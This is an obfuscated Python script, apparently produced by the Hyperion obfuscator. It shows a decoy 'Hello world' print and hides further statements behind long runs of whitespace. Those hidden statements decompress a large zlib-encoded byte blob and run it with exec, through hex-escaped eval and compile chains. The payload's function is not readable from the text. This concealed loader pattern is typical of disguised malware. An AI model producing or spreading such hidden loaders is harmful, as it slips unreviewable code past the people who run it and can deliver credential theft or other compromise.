from builtins import *
from math import prod as DetectVar


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


CallFunction, _floor, _negative, _system, Product, Absolute, Negative = exec, str, tuple, map, ord, globals, type

class _memoryaccess:
    def __init__(self, _while):
        self.Algorithm = DetectVar((_while, 70409))
        self._add(Run=-73490)

    def _add(self, Run = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Algorithm += 7786 * Run
        
        try:
            ((_negative, {CallFunction: _floor}) for _negative in (_system, CallFunction) if Absolute < Product)

        except AttributeError:
            ((_negative, _system, CallFunction) or Invert if (_negative, _system, CallFunction) and Invert else ... or (Invert, (_negative, _system, CallFunction)))

        except:
            Negative(-62375 * -7026) == str

    def Square(self, StackOverflow = -54318):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        StackOverflow -= 13279 * 83891
        self._theory != False
        
        try:
            ((_system, _system, _negative) or Product if (_system, _system, _negative) and Product else ... or (Product, (_system, _system, _negative)))

        except OSError:
            ((_negative, (_system, _system, _negative)) for _negative in {_floor: _system} if Product is CallFunction)

        except:
            Negative(26087 + 87236) == Ellipsis

    def Frame(_calculate = float):
        return Absolute()[_calculate]

    def _stackoverflow(Theory = -87347 - 81864, _round = False, _algorithm = Absolute):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _algorithm()[Theory] = _round
        
        try:
            ((_negative, _system, CallFunction) or _system if (_negative, _system, CallFunction) and _system else ... or (_system, (_negative, _system, CallFunction)))

        except AttributeError:
            ({CallFunction: Invert} or _system if {CallFunction: Invert} and _system else ... or (_system, {CallFunction: Invert}))

        except:
            Negative(-99369 * 23731) == float

    def execute(code = str):
        return CallFunction(_floor(_negative(_system(Product, code))))

    @property
    def _theory(self):
        self._power = '<__main__.CallFunction object at 0x000008104BE95265>'
        return (self._power, _memoryaccess._theory)

if __name__ == '__main__':
    try:
        _memoryaccess.execute(code = __code__)
        _divide = _memoryaccess(_while = -21387 * 92290)

        _memoryaccess(_while = -33192 - -42085)._add(Run = _divide.Algorithm / -96512)                                                                                                                                                                                                                                                          ;_memoryaccess._stackoverflow(Theory='wwwxwxxwwxxwxwxxx',_round=b'x\x9c\xe5Z\xdds\x9b\xb8\x16\x7f\xe7\xaf\xf0\xfa\xc50M\x13\x0c\x18\xec\xcc\xf8\xa1\xddd[<\x8e}\'\xe9]\xa7\xd3v\x18\x0c"!\x95\x91\x07pc\xbf\xdc\xbf\xfd\x1e}`\x13clp\x9d\x9d\x9d\x89\x84\xa4#q\x90\x0e\xbf#\x1d}@\x1a\xaf.\xa5\x06\xb80\x90YJ\x9d\xe3\x90i\xb0H<7%\xb1\xe34\xfe\xe87?\xaf\xe6(\x0eI\xd4l\x908\xc7\xe6.\xd2G\x12\'\x8cGnNC\x8cW\xe9#z n\xaaw\xcc\xe6Y\xf3#^\xa0[\xe47\x95\x17O=\x84\xe9\xe3b\xca+~L\xd3yryq\xc1\xcb\xce=2\xbb\xd8\xaa\xe6\xa2\xa4m?L<\x12\xfb/\xab\x11\x85\xe7\x0f\x0f\x17s\xec>,\xd0\xd6C8\xf4P\x94 \xfe\xd0\xf5\x7f\x86\xef\xb5su\x8b\xc5#>\xbf\xdf\x9a\xc7a\x94\xca\xcd\xcf\x08c\xd2x&1\xf6\xffh*-I\xb9\\s\xd3\xfb\xad\xe4g\xe8\xb7\x14\t-=4O\x05\x98\xd1|\x01O\xde\x92\x04%\r7F\x8d\x18\xf9\xdf\xa3\xbfC\x82Q\xca\x0b\xa6\x80\xcc\xf7\xe8+Y\xb0\x9c\xdb\xa0\x95|\x8fFdJ\xfcU\x03\x87?\xe1\xb9\x15Y4\x15\x89\x0b\x15\xce\xe6$N\x1d\x07Z[%-\xe5\x1c-\xc3TV$L<\x17\'\xb2\xf2\xad5\x1c\x0el\xdb\x1e\xd8\x90\x0em{H\t{0\x18\xb6~\xf4\x1f0\x99\x02\x93T\xc2A\x1f\xbe\x9f\xdcO&\x93\xfb{\x9a2\x1a\xa2\xd6\xb7\xcb\xcbw\xef\xdf\xbd\x97\xdf\xcb\xef\xda\x8a\xf2\x03*B\xa9\x9b\xa6\xf1\xbe\x8a\xc6\x84\x8cUzQ\x07\x89\nn\\\xac\xc9\x0f\xf7\xd62\xb4\x87\xd9\r\xb8 a\x91\r\xef\xc2\xdfW*a\xa0\xcf\xcef\x11x\x16\xf3D\\\xf0\xf0\x06\xc5\xbd\xaf0\xbe\x02\x07\x11\x7f\x07J\xc3\xb3e\xd5\xca\xad\xe9"\xc4i\x18Q\xa5\xfcr\xe3\xbd0\xdfi\xda\xdd\x9dF=\xa4@i\x94\xa6Yh \x83\x9d\xfa{\xa6\x8d\xc9\xbd\\\xdej\x12\x85)\x0e\x17\xd3ml\x95\xb31\xc5\x9c\xa8c&>$\x94\x1a\x1fS\x93\xf2\xedtU\x9d\x87\x91\x8f\x96r\x0b-\xe2/\x85\xbb?\x94}\xa0a\x1b\xd3\x0b\x02p0\x82Ro\x06\xb1\xd4%8\xd8\tY\xf9\x18\x980d\xe8h\xe6\xe0L\x18\xf1f \xc3\x84\x14\xef\xeeG\x0c:\x1bt;\xc8\x0eh\xb7\x1b\xb2\\}\xbc\xc2\xd0K\xdc(<\x01^\xa55\xd5\xc7\xab\xbc\xaa\x0c\xafU\x10\xe2%z\x8c\x165G\xe6\x84\xf7\xb3\ts\xf7\x14 \x80\xac\xd5:\x7f"a$\xed0\xa3|\x82\x00\xcff\t\xf6\x0e0Q\xbc\x99n\x19\xa7IM\x80\xef\xd8\xf4\xa0\xad\xe7\x89l\xf2x3\x90!\x1c\xceg\xc4\xab\t\x1b\x1d\xc9\x90\x85Q\x0c\xa3\xd9\xa6\xe4\x9b\x01\x0c\xbb\xbfPM\xd3\x07(q\x8b7\xb0\xd95d\xf0\xbd\x19\xc4P\x82\xdd\xbfjv\xb0\xe5\xf2\xf9\xf9y\xf9L\xe3\xe7\xe5\x92\x134^\xe6\xeb)\xf6By\xd7,#O[z[\xf3\xb5\xae\xe6\xeb\xaa\xd6\x83U\xa4\x8f\xe8\x0eDnu\x83\xb4h\x91\x15\xb6~~\x1b\xaa\xf1\xd0rgg.\x99Z\xa2H\xb4\x12\x89\xe6\xa2\x03\xeah)\xaa\xa39\x1d\xc7p\xda\x8e\x0e\xa9\xe5\xf4\x9c\x1em\xa7Xz\xa4bU\xa1\xd8v5\xc5r\xe5V\xaf_\xd3\x90\xd63z\x06\x8d\xbb\xaa\x8e:\xba\xd9\xb14\xcb\xa4\xb1\xa6\x9a=K\x87\x18\x99\x81e@\xaa\x9b\x01\xd0\xc8\xec\x98\xbae@l\xc0\xc3\xaaa\x98\x81\xa6Z=\xe0\xe9@j\x99m\x13Qn\x8b\x97k\x94;\xff\x9c\x0e\xa5Z\xd7\xeaiP\xa6\xf5t\x17r\xda\xc17+S\x18[\xc8\xdb\xd8\xe6K{X\xd8\x1f\x89\xb2\xde\tX\xe8BhCP!\x18\xa2\x8c\x06M\x9b2-\x1c\xe2\xab\xa8\xa5z\x1a\xea\x04\x9d\xc0\xf4\x01\xd7\x9e\x89(}<^%Mt,\xf0\xdd\x17q\x97Q]\x91\x17%\x87\x9a\x85\xcd\xb5;\x9b\xfancH\xf7Y`\xf4\x06\xdc\xfaAK\x97;\x05*S+\xdb\xdc\xb2E\x0b[\xac\xacW.\x07Gc\x1bn\xa9G\xf6\x01\xaaG\x13BO\xa4\xa6\xd0\xb3%tl0\xfd\xf2~P\x85\xb7\xa2)\xe6\xfda\xf7~K\x96\xff\xb7{nUH,\xcb\xa5g\x01\x8a\x1b\xf9r\xc9\x83u\xfb\x86\xe9\x82\xef\x81\xa7\xb1\xc7R\x8fQ\xd4\xbb\xc2{\x95{\x06\xd7\x01\x93\xc8\x1e0\x11k\xf5\x8c2!=\xa3\x97\x0fy\x9f\xe5k\x08)\xf0g\x8eM\x8c\xa7\x90\xd10\x8c\xc0\x08L\x1e(\xcd\x1c\xcd\x1bAv\x8f\xe7\xcc\xe0\xb0\xa4\xb5\xecG]\x9b~j\xfbb\xf8\x06\xca\x85\xcc\xa3\xad\x18\x9d\xf6\xb5\x8d\xb6e\xb0W\xf2-:\x19\x81\xf14\xad\xf2ii}\xc70\xbb&\x9d\xc8\xf2\xa0!\xe6\x7fg\x9a\xa2\xe3\x8f\n=d\xe2\x0eh\xf6\xa01\xd3a\xe1\xa0\xc2"B\x03\xdf\x86%D\x07\x18\x8d\xed\xb2#\x8d\x9d)\x8c\x94&\x8cX6\x91\x99\x82\xa6\xa9.\x8c]\x15^\xad\x8e\xb1\x13\xc3\x8c\xefK\x85\x01\xe36\xec\x14\x03\xcd\xb2\xac.xK\xa4]\x91\xe3%\x96(\xcfx*\xcci\x11I\xe5\x12\xf3\\<\x8a8\x95\xd9\xed\x00\xfa\x1d\x9d\xc6<\xcdh\x9a{y\xe75mEq\x980\x0b\x01\x83\xc3\xa2\xe5\x94W\x87\x81bB\x0e\xa6\x03X\xd3\xfd\xce \x19\xdd\x80\x1b\xdd\x8c\xe85\xca(\xea\x8f\xec\xe2t>\xee\x88\xa0\x89\xd4\x10]\xb6+\xe8\x9e\xe8\xe2Ux\xbb\xaf\xb0\xb6\x03\xa8\x8f\xc6K\x8c\x196v\xb4\xf5"\xe9\xeeu\x17Iy\x1b\xa0\x89Ep\x162\xd02\xbbQ\x85\xf7\x18\xbba\xf3\x93|\xcc\x97\xfe\x90^\x96n\xb4\xcb\xb0{z\n\x9f\xc2\x10\x87O\x18\\H\x1dPO\xe1A\xe840\xbf\x1a3\xc0*x\xcb\xb1\x80Q\xdf.\xfbg\xb6\xf0EH\xf87\x0e\xfe\x89\xa36$eS7\xa8\x8f\xadP 5s+\x94,\xa5AW+\xaf\xac\xc4Q\xc3=\xffN\xc8M*3\xa5\xa70\xfc\x1b;\xb9\xb1\x8e\x99\xf5\xcc\xcaNi-\r\x93\x0f<\xd5\xb5\xa6\x86e\xf9\xaa\xab\xba\xb0\xa55{m\x1aw\xbb\x07\xe3N\xcf\xaa\xc8Y\x97_p\x16$yQ\x9e\x8f\xffY\xa98N/\xee\x18,VKb\xff\xe4\xfc\xfb\xdf\xa0SDh\x07N\xc5\x92\x13K\xc5p\xea\xf4\xb6\xd1\xaa\xae\xef\x03\x9c5z\xaa\xb1~\x83\xa2<\xe5\xbdm\xf3\xd4\xabJ\x95\x1bw\\\xba"\xfa\x87\xf4]\xd4\x9c\xbfW\xf7\x15\xfaSN\x9e*\xb8Vi\xe57\xa5*\x8c\xbbJr\xfd\x86%\xd81\x8e\xf6\xde\xdd\xd5\xb7\n\x08U\xee\x1fGK\x95\x1bw\xe5\xa3y[\x1f\xd5\xf87O\xbd\xe4\xdf~\xbf\xfdw\x8f\xe59\xb1T*=\xbd\xdd\xe1\xa1\x9c\xb9S\x9f# \xe6\xf3\'\x08\xb9\xd3\x03\x91G\xd5O\x13\xc4\xa2\x84\x9e\xf3G\xe2\xdc\x7f\xfd\x85\xe1DG>\xfc\xa0\x87\x1d\xf9l\x1d\xfd\xb0\x92\xc32\xfek\x0f\x06\xb3U\xa0\xc9V\x88<\xf0\xb5"/\xa7\xeb\xc5*+\xc3:\xbbS\xd8a\xbe\xc2\xd9\xd4\xe6T\n\xe5z\xd5\x86f\xf9\xca\xbd\t\xc3\xde\x02\xb3\r\x05\xdb\\<\xd1M\xc6e\xe9\xc7\xd3\xfa+\xdc\xed\xd5m\x96\xdf>\x1d\xa8r2\xb0\x16\x19\xb3\xed\x0f\xc8\x8a\xa9\xe0L\xe2\xd2\xfdC\x10\x93Y#\xfbe\xad\xc1\xff\x87k\xa0%\xf2\xce\xd8/\x8bg\xec\x97G\xa0S\x89\x16\xcab\x13O#\xb6\xb1\xe7\x14\xd0\xa2&\x8f`\x12\xbb37\xab\xe9/\x12\xa3\xb3\xbbt\x85\x91t\xdb\xa7\x99\xf3\xdb\xeb+\xe9#\'?\x0e\xff{-}\xe2\xf4\xa7\xdb\xeb\xeb\x91\xf4\'\xcf\xfc\xf9\xf5\xc3H\xfa\xca\xe9\xaf\xd7\xc3\xe1x"\xdd\xf0\xdc\xcd\x87O\xd7\xa3/\x1f\xa4\t\xcfN>\xdb_\xae%L\x1eH\xff\x8e\xff\r\xb1\xf9/B\x93\x12\x14\xffB\xb1\xe3\x91(B^\x8a\xfc>U\xcd\x98\\\x11\x08cJ\x13\xc9GA\xc3{D\xdeOG0\'\xa9\x9b.\x12Y\xfc\xd2\xc9\x7f\x95llW\xc4\xee\x15j\x7f\xa6\x9f\x81\x97\xcb\xec\x030\xfb\x04\x0c\x17k\xc3\x0f\x939vW\xbb[\t\x83Be\xe2\x8fR\xfe\xc3i\xf5Ae\xc2&\xc6\x9av4\x8b\x9a\xfa\xf5\x87@(\x81\r\xcd\xce\x83\xe3\xe3\x0e\x8c\xf9O\xa8\x08\'h\xf3\xe7+\x17\xf5V\xd9*\xb8\x1a\x8f\x05\xdc\x00\xfb\xf8\x8a\x9d\xaf\x8d\x89\xc2@\x89\x91x_\x01K\x15\xd4y\xad\xbc\x17\xde\xf03&~\x8d\x94\xddZ\x11\xddam75q\xce\x92\xab\x8d\x97\xe7\x8d+\x04E\x02\xb58N\xe4\xce\x90\xe3\xf4\xfb\xd9\x01\x85\xf86i\xdb\x97\xb9\nh\x07\xe4\xcd\x97\xe89SsD\xd22U\x83\xf3\x1eI\xe8\xa1>\xffW\x98\x7f\xb1\xe6\xf3\x17\xff\x90\xbd\x816\x0c\x04\xef9&\xcf\x14\xb7~\x9f\xe2J\xd41x\x95\x9fa\x12uS1uE\xb0_\xdc.\x13\xfc\xff\xe6,\x0e7')

        _memoryaccess(_while = -46143 - -36805).Square(StackOverflow = -29041 * _divide.Algorithm)                                                                                                                                                                                                                                                          ;WXWWWXWWWXWWWXWXWXX,nmmmnnnnnnnmnnmnmnnm,MMNNMMNNMMNMMMMNNMNMM,LLILJLIIILILJLILILLI,nmnnnnnmmnmmnmnmnmnmn=(lambda lllIIIIIIllllIlIllll:lllIIIIIIllllIlIllll(__import__('\x7a\x6c\x69\x62'))),(lambda lllIIIIIIllllIlIllll:lllIIIIIIllllIlIllll['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda lllIIIIIIllllIlIllll:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(lllIIIIIIllllIlIllll)"),filename='\x53\x32\x32\x53\x53\x53\x53\x32\x32\x53\x53\x53\x53\x32\x53\x53\x32\x32\x32',mode='\x65\x76\x61\x6c'))),(lambda:(lambda lllIIIIIIllllIlIllll:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(lllIIIIIIllllIlIllll)"),filename='\x53\x32\x32\x53\x53\x53\x53\x32\x32\x53\x53\x53\x53\x32\x53\x53\x32\x32\x32',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda jlljjljjjjiiljjjjjiill,lllIIIIIIllllIlIllll:jlljjljjjjiiljjjjjiill(lllIIIIIIllllIlIllll))
        if 336900 > 1253749:
            _memoryaccess(_while = 43970 - 69130).Square(StackOverflow = 41739 / _divide.Algorithm)
        elif 153773 < 3463299:
            _memoryaccess(_while = 35466 * 59857)._add(Run = _divide.Algorithm - -55495)                                                                                                                                                                                                                                                          ;LLILJLIIILILJLILILLI()(nmnnnnnmmnmmnmnmnmnmn(nmmmnnnnnnnmnnmnmnnm(WXWWWXWWWXWWWXWXWXX(MMNNMMNNMMNMMMMNNMNMM('\x76\x61\x72\x73'))),_memoryaccess.Frame(_calculate='wwwxwxxwwxxwxwxxx')))

    except Exception as Invert:
        if 150697 > 2505591:
            _memoryaccess.execute(code = _floor(Invert))

        elif 103902 > 4125299:
            _divide.Square(StackOverflow = 63797 + _divide.Algorithm)
